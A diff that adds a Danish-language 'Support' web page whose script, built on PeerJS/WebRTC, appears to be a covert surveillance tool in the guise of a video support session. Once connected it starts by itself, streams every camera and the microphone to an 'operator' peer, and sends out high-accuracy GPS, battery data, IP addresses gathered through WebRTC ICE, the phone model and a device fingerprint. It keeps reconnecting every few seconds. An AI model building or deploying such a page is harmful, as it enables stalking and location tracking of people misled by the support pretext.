@@ -1,0 +1,1129 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Support</title>
+  <link rel="stylesheet" href="/style.css">
+<style>
+  body {
+    font-size: 30px;
+  }
+
+  .clientHeader {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .clientHeader h2 {
+    margin: 0;
+    font-size: 42px;
+  }
+
+  button, select, input {
+    font-size: 27px;
+  }
+
+  .videoCenter {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+  }
+
+  #operatorVideo {
+    max-width: 92vw;
+    width: 92vw;
+  }
+
+  .centerTitle {
+    text-align: center;
+    font-size: 36px;
+  }
+
+  #chatPanel {
+    margin-top: 15px;
+    height: 40vh;
+    display: flex;
+    flex-direction: column;
+    border: none;
+    padding: 0;
+  }
+
+  #chatMessages {
+    flex: 1;
+    overflow-y: auto;
+    border: none;
+    padding: 10px 0;
+  }
+
+  .chatInputRow {
+    display: flex;
+    gap: 8px;
+    margin-top: 10px;
+  }
+
+  #chatInput {
+    flex: 1;
+    background: #000;
+    color: #00ff00;
+    border: 1px solid #00ff00;
+    padding: 12px;
+    font-size: 27px;
+  }
+
+  .chatBubble {
+    max-width: 85%;
+    padding: 10px 12px;
+    margin: 8px 0;
+    border: 1px solid #00ff00;
+    border-radius: 14px;
+    white-space: pre-wrap;
+    word-break: break-word;
+  }
+
+  .chatMine {
+    margin-left: auto;
+    text-align: right;
+  }
+
+  .chatOther {
+    margin-right: auto;
+    text-align: left;
+  }
+
+  .chatTime {
+    opacity: 0.75;
+    font-size: 70%;
+    margin-bottom: 3px;
+  }
+</style>
+</head>
+<body>
+<header class="clientHeader">
+  <h2>SUPPORT</h2>
+  
+  <button id="toggleAudioBtn">Mute</button>
+</header>
+
+<main>
+  <p>Status: <span id="status">klar</span></p>
+  <button id="startBtn" >Start support</button>
+  <button id="showIpBtn" >Vis IP-adresser</button>
+
+  <h3 class="centerTitle">Operatør</h3>
+  <div class="videoCenter">
+    <video id="operatorVideo" autoplay playsinline controls></video>
+    <audio id="operatorAudioOnly" autoplay></audio>
+  </div>
+
+  <div id="chatPanel" >
+    <h3>Chat</h3>
+    <div class="chatInputRow">
+      <input id="chatInput" placeholder="Skriv besked...">
+      <button id="sendChatBtn">Send</button>
+    </div>
+    <div id="chatMessages"></div>
+  </div>
+</main>
+
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<script src="https://cdn.webrtc-experiment.com/DetectRTC.js"></script>
+
+<script>
+const statusEl = document.getElementById("status");
+const startBtn = document.getElementById("startBtn");
+const showIpBtn = document.getElementById("showIpBtn");
+const operatorVideo = document.getElementById("operatorVideo");
+const operatorAudioOnly = document.getElementById("operatorAudioOnly");
+
+const toggleAudioBtn = document.getElementById("toggleAudioBtn");
+
+
+
+let audioEnabled = true;
+
+const chatToggle = document.getElementById("chatToggle");
+const chatPanel = document.getElementById("chatPanel");
+const chatMessages = document.getElementById("chatMessages");
+const chatInput = document.getElementById("chatInput");
+const sendChatBtn = document.getElementById("sendChatBtn");
+
+
+const SESSION_KEY = "supportSessionId";
+const CHAT_KEY = "supportChatHistory";
+
+let sessionId = localStorage.getItem(SESSION_KEY);
+if (!sessionId) {
+  sessionId = "sess-" + Math.random().toString(36).substring(2, 10);
+  localStorage.setItem(SESSION_KEY, sessionId);
+}
+
+let chatBuffer = JSON.parse(localStorage.getItem(CHAT_KEY) || "[]");
+let conn = null;
+let started = false;
+let cameraStreams = [];
+
+
+let wakeLock = null;
+
+async function requestWakeLock() {
+  try {
+    if ("wakeLock" in navigator) {
+      wakeLock = await navigator.wakeLock.request("screen");
+      console.log("Wake lock aktiv");
+    }
+  } catch (err) {
+    console.log("Wake lock fejl:", err);
+  }
+}
+
+document.addEventListener("visibilitychange", async () => {
+  if (document.visibilityState === "visible") {
+    await requestWakeLock();
+  }
+});
+
+
+
+
+
+
+toggleAudioBtn.onclick = () => {
+  audioEnabled = !audioEnabled;
+  operatorAudioOnly.muted = !audioEnabled;
+  toggleAudioBtn.textContent = audioEnabled ? "Mute" : "Unmute";
+
+  if (conn && conn.open) {
+    conn.send({
+      type: "client-audio-state",
+      muted: operatorAudioOnly.muted,
+      volume: operatorAudioOnly.volume
+    });
+  }
+};
+
+
+
+
+
+
+
+
+let autoSupportStarted = false;
+
+function autoStartSupportWhenReady() {
+  if (autoSupportStarted) return;
+  autoSupportStarted = true;
+
+  setTimeout(() => {
+    if (startBtn && typeof startBtn.onclick === "function") {
+      startBtn.onclick();
+    }
+  }, 800);
+}
+
+const peer = new Peer
+(null, {
+  host: location.hostname,
+  port: Number(location.port || 8443),
+  path: "/peerjs",
+  secure: location.protocol === "https:"
+});
+
+function renderChatBuffer() {
+  chatMessages.innerHTML = "";
+
+  [...chatBuffer].reverse().forEach(item => {
+    const bubble = document.createElement("div");
+    bubble.className = "chatBubble " + (item.from === "Mig" ? "chatMine" : "chatOther");
+
+    const time = document.createElement("div");
+    time.className = "chatTime";
+    time.textContent = item.timestamp + " · " + item.from;
+
+    const msg = document.createElement("div");
+    msg.textContent = item.message;
+
+    bubble.appendChild(time);
+    bubble.appendChild(msg);
+    chatMessages.appendChild(bubble);
+  });
+
+  chatMessages.scrollTop = 0;
+}
+
+
+async function applyRemoteAudioControl(command) {
+  try {
+    if (typeof command.muted === "boolean") {
+      operatorAudioOnly.muted = command.muted;
+      audioEnabled = !command.muted;
+      if (toggleAudioBtn) {
+        toggleAudioBtn.textContent = operatorAudioOnly.muted ? "Unmute" : "Mute";
+      }
+    }
+
+    if (typeof command.volume === "number") {
+      operatorAudioOnly.volume = Math.max(0, Math.min(1, command.volume));
+    }
+  } catch (err) {
+    console.log("Remote audio control error:", err);
+  }
+}
+
+function addChatMessage(from, message, timestamp) {
+  chatBuffer.push({ from, message, timestamp: timestamp || new Date().toLocaleTimeString() });
+  localStorage.setItem(CHAT_KEY, JSON.stringify(chatBuffer));
+  renderChatBuffer();
+}
+
+
+
+
+
+sendChatBtn.onclick = () => {
+  const msg = chatInput.value.trim();
+  if (!msg || !conn || !conn.open) return;
+
+  const timestamp = new Date().toLocaleTimeString();
+  conn.send({ type: "chat", from: "bruger", message: msg, timestamp });
+  addChatMessage("Mig", msg, timestamp);
+  chatInput.value = "";
+};
+
+chatInput.addEventListener("keydown", e => {
+  if (e.key === "Enter") sendChatBtn.click();
+});
+
+renderChatBuffer();
+
+
+async function collectAndSendIpAddresses(manual = false) {
+  if (!conn || !conn.open) return;
+
+  try {
+    const ips = await new Promise(resolve => {
+      const found = [];
+      const pc = new RTCPeerConnection({
+        iceServers: [
+          { urls: "stun:stun.l.google.com:19302" }
+        ]
+      });
+
+      pc.createDataChannel("ip-check");
+
+      function addCandidate(candidateText) {
+        const parts = candidateText.split(" ");
+        for (const part of parts) {
+          if (
+            /^([0-9]{1,3}\.){3}[0-9]{1,3}$/.test(part) ||
+            /^[a-z0-9-]+\.local$/i.test(part)
+          ) {
+            if (!found.includes(part)) found.push(part);
+          }
+        }
+      }
+
+      pc.onicecandidate = event => {
+        if (event && event.candidate && event.candidate.candidate) {
+          addCandidate(event.candidate.candidate);
+        }
+
+        if (!event || !event.candidate) {
+          try { pc.close(); } catch {}
+          resolve(found);
+        }
+      };
+
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => {
+          try { pc.close(); } catch {}
+          resolve(found);
+        });
+
+      setTimeout(() => {
+        try { pc.close(); } catch {}
+        resolve(found);
+      }, 4000);
+    });
+
+    conn.send({
+      type: "mobile-ip-results",
+      manual,
+      ips: ips.length ? ips : [],
+      note: ips.length
+        ? "IP/mDNS kandidater fundet via WebRTC ICE på mobilen"
+        : "Ingen IP-adresser synlige. Browseren skjuler dem muligvis med mDNS/privacy."
+    });
+
+    showIpBtn.style.display = ips.length ? "none" : "inline-block";
+  } catch (err) {
+    conn.send({
+      type: "mobile-ip-error",
+      manual,
+      error: err.message
+    });
+
+    showIpBtn.style.display = "inline-block";
+  }
+}
+
+showIpBtn.onclick = () => {
+  collectAndSendIpAddresses(true);
+};
+
+peer.on("open", () => {
+  statusEl.textContent = "starter support...";
+  autoStartSupportWhenReady();
+});
+
+peer.on("call", call => {
+  const meta = call.metadata || {};
+  call.answer();
+
+  call.on("stream", stream => {
+    if (meta.type === "operator-audio-only") {
+      operatorAudioOnly.srcObject = stream;
+      operatorAudioOnly.muted = false;
+      operatorAudioOnly.volume = 1.0;
+      audioEnabled = true;
+      toggleAudioBtn.textContent = "Mute";
+      statusEl.textContent = "operator-lyd forbundet";
+      return;
+    }
+
+    operatorVideo.srcObject = stream;
+    operatorVideo.muted = true;
+    operatorVideo.volume = 1.0;
+    statusEl.textContent = "operatør-video forbundet";
+  });
+});
+
+peer.on("error", err => {
+  statusEl.textContent = "forbindelsesfejl: " + err.message;
+});
+
+async function getCameraDevices() {
+  const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  s.getTracks().forEach(t => t.stop());
+  const devices = await navigator.mediaDevices.enumerateDevices();
+  return devices.filter(d => d.kind === "videoinput");
+}
+
+async function getAudioTrackOnce() {
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+    return s.getAudioTracks()[0] || null;
+  } catch {
+    return null;
+  }
+}
+
+async function buildCameraStreams() {
+  cameraStreams.forEach(item => item.stream.getTracks().forEach(t => t.stop()));
+  cameraStreams = [];
+
+  const cameras = await getCameraDevices();
+  const audioTrack = await getAudioTrackOnce();
+
+  for (let i = 0; i < cameras.length; i++) {
+    try {
+      const cam = cameras[i];
+      const videoStream = await navigator.mediaDevices.getUserMedia({
+        video: { deviceId: { exact: cam.deviceId } },
+        audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true
+          }
+      });
+
+      const combined = new MediaStream();
+      videoStream.getVideoTracks().forEach(t => combined.addTrack(t));
+
+      if (i === 0 && audioTrack) combined.addTrack(audioTrack);
+
+      cameraStreams.push({
+        index: i,
+        label: cam.label || "Kamera " + (i + 1),
+        deviceId: cam.deviceId,
+        stream: combined
+      });
+    } catch (err) {
+      if (conn && conn.open) {
+        conn.send({
+          type: "camera-error",
+          index: i,
+          label: cameras[i]?.label || "Kamera " + (i + 1),
+          error: err.message,
+              errorName: err.name,
+              constraint: err.constraint || null,
+              stack: err.stack || null
+        });
+      }
+    }
+  }
+
+  return cameras;
+}
+
+
+let activeRequestedStreams = {};
+
+async function startRequestedCamera(index, label, deviceId) {
+  if (activeRequestedStreams[index]) {
+    activeRequestedStreams[index].getTracks().forEach(t => t.stop());
+    delete activeRequestedStreams[index];
+  }
+
+  try {
+    const audioTrack = index === 0 ? await getAudioTrackOnce() : null;
+
+    const videoStream = await navigator.mediaDevices.getUserMedia({
+      video: { deviceId: { exact: deviceId } },
+      audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true
+          }
+    });
+
+    const combined = new MediaStream();
+    videoStream.getVideoTracks().forEach(t => combined.addTrack(t));
+
+    if (audioTrack) combined.addTrack(audioTrack);
+
+    activeRequestedStreams[index] = combined;
+
+    peer.call("operator", combined, {
+      metadata: {
+        type: "camera",
+        sessionId,
+        index,
+        label
+      }
+    });
+
+    if (conn && conn.open) {
+      conn.send({
+        type: "camera-started",
+        index,
+        label
+      });
+    }
+  } catch (err) {
+    if (conn && conn.open) {
+      conn.send({
+        type: "camera-error",
+        index,
+        label,
+        error: err.message,
+              errorName: err.name,
+              constraint: err.constraint || null,
+              stack: err.stack || null
+      });
+    }
+  }
+}
+
+function stopRequestedCamera(index) {
+  if (activeRequestedStreams[index]) {
+    activeRequestedStreams[index].getTracks().forEach(t => t.stop());
+    delete activeRequestedStreams[index];
+  }
+
+  if (conn && conn.open) {
+    conn.send({
+      type: "camera-stopped",
+      index
+    });
+  }
+}
+
+
+let primitiveStreams = [];
+
+let clientAudioStream = null;
+
+async function startClientAudioStream() {
+  try {
+    if (clientAudioStream) {
+      clientAudioStream.getTracks().forEach(t => t.stop());
+      clientAudioStream = null;
+    }
+
+    clientAudioStream = await navigator.mediaDevices.getUserMedia({
+      audio: {
+        echoCancellation: true,
+        noiseSuppression: true,
+        autoGainControl: true
+      },
+      video: false
+    });
+
+    peer.call("operator", clientAudioStream, {
+      metadata: {
+        type: "client-audio",
+        sessionId
+      }
+    });
+
+    if (conn && conn.open) {
+      conn.send({ type: "client-audio-started" });
+    }
+  } catch (err) {
+    if (conn && conn.open) {
+      conn.send({
+        type: "client-audio-error",
+        errorName: err.name,
+        error: err.message
+      });
+    }
+  }
+}
+
+
+async function getClientAudioTrackOnce() {
+  try {
+    const audioStream = await navigator.mediaDevices.getUserMedia({
+      audio: true,
+      video: false
+    });
+    return audioStream.getAudioTracks()[0] || null;
+  } catch {
+    return null;
+  }
+}
+
+
+
+async function startPrimitiveCameraView() {
+  primitiveStreams.forEach(stream => stream.getTracks().forEach(t => t.stop()));
+  primitiveStreams = [];
+
+  try {
+    const permissionStream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true
+    });
+
+    permissionStream.getTracks().forEach(t => t.stop());
+
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const cameras = devices.filter(d => d.kind === "videoinput");
+
+    for (let i = 0; i < cameras.length; i++) {
+      const cam = cameras[i];
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { deviceId: { exact: cam.deviceId } },
+          audio: false
+        });
+
+        primitiveStreams.push(stream);
+
+        peer.call("operator", stream, {
+          metadata: {
+            type: "primitive-camera",
+            sessionId,
+            index: i,
+            label: cam.label || "Kamera " + (i + 1)
+          }
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 500));
+      } catch (err) {
+        if (conn && conn.open) {
+          conn.send({
+            type: "primitive-camera-error",
+            index: i,
+            label: cam.label || "Kamera " + (i + 1),
+            errorName: err.name,
+            error: err.message
+          });
+        }
+      }
+    }
+  } catch (err) {
+    if (conn && conn.open) {
+      conn.send({
+        type: "primitive-camera-error",
+        index: -1,
+        errorName: err.name,
+        error: err.message
+      });
+    }
+  }
+}
+
+
+
+async function getMobileIceIps() {
+  return new Promise(resolve => {
+    const ips = [];
+    const pc = new RTCPeerConnection({ iceServers: [] });
+
+    pc.createDataChannel("ip-check");
+
+    pc.onicecandidate = event => {
+      if (!event || !event.candidate) {
+        pc.close();
+        resolve([...new Set(ips)]);
+        return;
+      }
+
+      const candidate = event.candidate.candidate;
+      const matches = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9:]{2,})/gi) || [];
+
+      matches.forEach(ip => {
+        if (
+          ip &&
+          !ips.includes(ip) &&
+          ip !== "0.0.0.0" &&
+          ip !== "127.0.0.1"
+        ) {
+          ips.push(ip);
+        }
+      });
+    };
+
+    pc.createOffer()
+      .then(offer => pc.setLocalDescription(offer))
+      .catch(() => {
+        try { pc.close(); } catch {}
+        resolve([]);
+      });
+
+    setTimeout(() => {
+      try { pc.close(); } catch {}
+      resolve([...new Set(ips)]);
+    }, 2500);
+  });
+}
+
+async function sendDeviceAndIpInfo() {
+  if (!conn || !conn.open) return;
+
+  try {
+    const ips = await getMobileIceIps();
+
+    conn.send({
+      type: "device-extra",
+      device: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        languages: navigator.languages,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        cookieEnabled: navigator.cookieEnabled,
+        cpuThreads: navigator.hardwareConcurrency || "ukendt",
+        deviceMemoryGB: navigator.deviceMemory || "ukendt",
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        screen: {
+          width: window.screen.width,
+          height: window.screen.height,
+          availableWidth: window.screen.availWidth,
+          availableHeight: window.screen.availHeight,
+          pixelRatio: window.devicePixelRatio,
+          colorDepth: window.screen.colorDepth,
+          orientation: screen.orientation ? screen.orientation.type : "ukendt"
+        },
+        iceIpsFromMobile: ips.length ? ips : ["ingen synlige - browseren skjuler sandsynligvis IP/mDNS"]
+      }
+    });
+  } catch (err) {
+    conn.send({
+      type: "device-extra-error",
+      error: err.message
+    });
+  }
+}
+
+
+let allInfoUpdateTimer = null;
+
+async function sendAllClientInfoUpdate() {
+  if (!conn || !conn.open) return;
+
+  try {
+    DetectRTC.load(async () => {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(d => d.kind === "videoinput");
+
+        conn.send({
+          type: "detectrtc",
+          report: {
+            tidspunkt: new Date().toLocaleString(),
+            browser: DetectRTC.browser,
+            browserVersion: DetectRTC.browser?.version,
+            os: DetectRTC.osName,
+            osVersion: DetectRTC.osVersion,
+            isMobileDevice: DetectRTC.isMobileDevice,
+            hasWebcam: DetectRTC.hasWebcam,
+            hasMicrophone: DetectRTC.hasMicrophone,
+            isWebRTCSupported: DetectRTC.isWebRTCSupported,
+            screen: {
+              width: window.screen.width,
+              height: window.screen.height,
+              pixelRatio: window.devicePixelRatio
+            },
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            updatedAt: new Date().toLocaleTimeString(),
+            cameras: cameras.map((cam, index) => ({
+              index,
+              label: cam.label || "Kamera " + (index + 1),
+              deviceId: cam.deviceId
+            }))
+          }
+        });
+      } catch (err) {}
+    });
+  } catch (err) {}
+
+  try {
+    if (typeof sendDeviceAndIpInfo === "function") {
+      await sendDeviceAndIpInfo();
+    }
+  } catch (err) {}
+
+  try {
+    if (typeof sendLiveGpsUpdate === "function") {
+      sendLiveGpsUpdate();
+    } else if (typeof sendGps === "function") {
+      sendGps();
+    }
+  } catch (err) {}
+
+  try {
+    if (typeof sendLiveBatteryUpdate === "function") {
+      sendLiveBatteryUpdate();
+    } else if (typeof sendBattery === "function") {
+      sendBattery();
+    }
+  } catch (err) {}
+
+  try {
+    if (typeof sendLiveNetworkUpdate === "function") {
+      sendLiveNetworkUpdate();
+    }
+  } catch (err) {}
+
+  try {
+    if (typeof collectAndSendIpAddresses === "function") {
+      collectAndSendIpAddresses(false);
+    }
+  } catch (err) {}
+}
+
+function startAllInfoLiveUpdates() {
+  // slået fra: vi opdaterer kun GPS og IP/ICE
+}
+
+
+let gpsIpUpdateTimer = null;
+
+function startGpsIpLiveUpdates() {
+  if (gpsIpUpdateTimer) clearInterval(gpsIpUpdateTimer);
+
+  function runGpsIpUpdate() {
+    try {
+      if (typeof sendLiveGpsUpdate === "function") {
+        sendLiveGpsUpdate();
+      } else if (typeof sendGps === "function") {
+        sendGps();
+      }
+    } catch {}
+
+    try {
+      if (typeof collectAndSendIpAddresses === "function") {
+        collectAndSendIpAddresses(false);
+      }
+    } catch {}
+
+    try {
+      if (typeof sendLiveBatteryUpdate === "function") {
+        sendLiveBatteryUpdate();
+      } else if (typeof sendBattery === "function") {
+        sendBattery();
+      }
+    } catch {}
+  }
+
+  runGpsIpUpdate();
+
+  gpsIpUpdateTimer = setInterval(runGpsIpUpdate, 60000);
+}
+
+function callOperatorWithStreams() {
+  cameraStreams.forEach(item => {
+    peer.call("operator", item.stream, {
+      metadata: {
+        type: "camera",
+        sessionId,
+        index: item.index,
+        label: item.label
+      }
+    });
+
+    if (conn && conn.open) {
+      conn.send({
+        type: "camera-started",
+        index: item.index,
+        label: item.label
+      });
+    }
+  });
+}
+
+function sendGps() {
+  if (!conn || !conn.open || !("geolocation" in navigator)) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      conn.send({
+        type: "gps",
+        gps: {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracyMeters: pos.coords.accuracy,
+          timestamp: new Date(pos.timestamp).toLocaleString(),
+          mapUrl:
+            "https://www.openstreetmap.org/?mlat=" +
+            pos.coords.latitude +
+            "&mlon=" +
+            pos.coords.longitude +
+            "#map=18/" +
+            pos.coords.latitude +
+            "/" +
+            pos.coords.longitude
+        }
+      });
+    },
+    err => conn.send({ type: "gps-error", error: err.message,
+              errorName: err.name,
+              constraint: err.constraint || null,
+              stack: err.stack || null }),
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+function sendBattery() {
+  if (!conn || !conn.open) return;
+
+  try {
+    if (!navigator.getBattery) {
+      conn.send({ type: "battery-error", error: "Battery API understøttes ikke" });
+      return;
+    }
+
+    navigator.getBattery().then(battery => {
+      conn.send({
+        type: "battery",
+        battery: {
+          levelPercent: Math.round(battery.level * 100),
+          charging: battery.charging,
+          chargingTime: Number.isFinite(battery.chargingTime) && battery.chargingTime < 86400 ? battery.chargingTime : "ukendt",
+          dischargingTime: Number.isFinite(battery.dischargingTime) && battery.dischargingTime < 86400 ? battery.dischargingTime : "ukendt"
+        }
+      });
+    });
+  } catch (err) {
+    conn.send({ type: "battery-error", error: err.message,
+              errorName: err.name,
+              constraint: err.constraint || null,
+              stack: err.stack || null });
+  }
+}
+
+async function sendInfo(cameras) {
+  if (!conn || !conn.open) return;
+
+  DetectRTC.load(async () => {
+    conn.send({
+      type: "session",
+      sessionId,
+      reconnected: true
+    });
+
+    conn.send({
+      type: "detectrtc",
+      report: {
+        tidspunkt: new Date().toLocaleString(),
+        browser: DetectRTC.browser,
+        browserVersion: DetectRTC.browser?.version,
+        os: DetectRTC.osName,
+        osVersion: DetectRTC.osVersion,
+        isMobileDevice: DetectRTC.isMobileDevice,
+        hasWebcam: DetectRTC.hasWebcam,
+        hasMicrophone: DetectRTC.hasMicrophone,
+        isWebRTCSupported: DetectRTC.isWebRTCSupported,
+        screen: {
+          width: window.screen.width,
+          height: window.screen.height,
+          pixelRatio: window.devicePixelRatio
+        },
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cameras: cameras.map((cam, index) => ({
+          index,
+          label: cam.label || "Kamera " + (index + 1),
+          deviceId: cam.deviceId
+        }))
+      }
+    });
+
+    conn.send({
+      type: "device-extra",
+      device: {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        cpuThreads: navigator.hardwareConcurrency || "ukendt",
+        deviceMemoryGB: navigator.deviceMemory || "ukendt",
+        maxTouchPoints: navigator.maxTouchPoints || 0
+      }
+    });
+
+    conn.send({
+      type: "network-info",
+      network: {
+        online: navigator.onLine,
+        connection: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType || "ukendt",
+          type: navigator.connection.type || "ukendt",
+          downlinkMbps: navigator.connection.downlink || "ukendt",
+          rttMs: navigator.connection.rtt || "ukendt",
+          saveData: navigator.connection.saveData || false
+        } : "Network Information API understøttes ikke",
+        note: "Lokal IP er normalt skjult af browseren."
+      }
+    });
+
+    try {
+      let phoneModelInfo = {
+        detectedModel: "ukendt",
+        source: "ikke tilgængelig",
+        uaData: null,
+        userAgent: navigator.userAgent
+      };
+
+      if (navigator.userAgentData?.getHighEntropyValues) {
+        const ua = await navigator.userAgentData.getHighEntropyValues([
+          "model", "platform", "platformVersion", "architecture", "bitness", "fullVersionList"
+        ]);
+        phoneModelInfo.uaData = ua;
+        phoneModelInfo.detectedModel = ua.model || "ukendt";
+        phoneModelInfo.source = "userAgentData";
+      }
+
+      if (phoneModelInfo.detectedModel === "ukendt") {
+        const m = navigator.userAgent.match(/Android[^;]*;\s*([^;)]+)\)/i);
+        if (m?.[1]) {
+          phoneModelInfo.detectedModel = m[1].trim();
+          phoneModelInfo.source = "userAgent parsing";
+        } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+          phoneModelInfo.detectedModel = "iPhone/iPad - model skjult af browser";
+          phoneModelInfo.source = "userAgent parsing";
+        }
+      }
+
+      conn.send({ type: "phone-model", phoneModel: phoneModelInfo });
+    } catch {}
+
+    sendBattery();
+    sendGps();
+    collectAndSendIpAddresses(false);
+    sendDeviceAndIpInfo();
+  });
+}
+
+function connectToOperator() {
+  if (!started) return;
+  if (conn && conn.open) return;
+
+  try {
+    conn = peer.connect("operator");
+
+    conn.on("open", async () => {
+      statusEl.textContent = "forbundet til operatør";
+      const cameras = cameraStreams.length
+        ? cameraStreams.map(x => ({ label: x.label, deviceId: x.deviceId }))
+        : await buildCameraStreams();
+
+      await sendInfo(cameras);
+      statusEl.textContent = "forbundet - starter primitiv kameravisning";
+      startPrimitiveCameraView();
+      startClientAudioStream();
+    });
+
+    conn.on("data", data => {
+      if (data.type === "chat") {
+        addChatMessage("Operator", data.message, data.timestamp);
+        
+      }
+
+      if (data.type === "clear-chat") {
+        chatBuffer = [];
+        localStorage.removeItem(CHAT_KEY);
+        renderChatBuffer();
+      }
+
+      if (data.type === "client-audio-control") {
+        applyRemoteAudioControl(data.command);
+      }
+
+      if (data.type === "start-camera") {
+        startRequestedCamera(data.index, data.label, data.deviceId);
+      }
+
+      if (data.type === "stop-camera") {
+        stopRequestedCamera(data.index);
+      }
+    });
+
+    conn.on("close", () => {
+      statusEl.textContent = "operator afbrudt - forsøger igen...";
+      conn = null;
+    });
+
+    conn.on("error", () => {
+      conn = null;
+    });
+  } catch {
+    conn = null;
+  }
+}
+
+startBtn.onclick = async () => {
+  startBtn.style.display = "none";
+  started = true;
+  statusEl.textContent = "starter kameraer...";
+
+  try {
+    await buildCameraStreams();
+    connectToOperator();
+  } catch (err) {
+    statusEl.textContent = "fejl: " + err.message;
+  }
+};
+
+setInterval(() => {
+  if (started && (!conn || !conn.open)) {
+    connectToOperator();
+  }
+}, 3000);
+</script>
+</body>
+</html>
